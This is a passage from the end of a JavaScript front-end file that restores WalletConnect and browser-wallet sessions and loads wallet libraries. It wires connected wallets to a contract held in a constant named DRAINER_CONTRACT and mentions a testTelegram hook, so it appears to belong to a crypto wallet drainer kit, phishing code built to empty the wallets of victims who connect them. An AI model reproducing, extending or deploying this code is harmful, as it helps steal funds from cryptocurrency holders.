          }
          logDebug('⚠️ WC restore: session did not hydrate in 3s');
        }
      } catch (e) {
        logDebug('WC restore: ' + e.message);
      }
    }

    // Injected restore
    if (savedMode === 'injected' || !savedMode) {
      const prov = window.ethereum;
      if (prov && isDesktopDevice) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = prov;
            activeProvider = prov;
            connectionMode = 'injected';
            web3Instance = new Web3Ctor(prov);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachInjectedEvents(prov);
            updateConnectedUI(savedWallet, 'evm');
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    logDebug('⚠️ No restorable session — clearing saved wallet');
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const [libs] = await Promise.all([
      loadWalletConnectLibraries(),
      pickRelayUrl().catch(() => null),
    ]);
    EthereumProvider   = libs.EthereumProvider;
    WalletConnectModal = libs.WalletConnectModal;
    Web3Ctor           = libs.Web3;
    logDebug('✅ All libraries loaded');

    setupEIP6963();

    // Pre-warm WC on mobile so the first tap is instant.
    if (isMobileDevice) {
      logDebug('📱 Pre-warming WalletConnect…');
      initWalletConnect({ useFallbackId: false }).catch(() => {});
    }

    await new Promise((r) => setTimeout(r, 300));
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
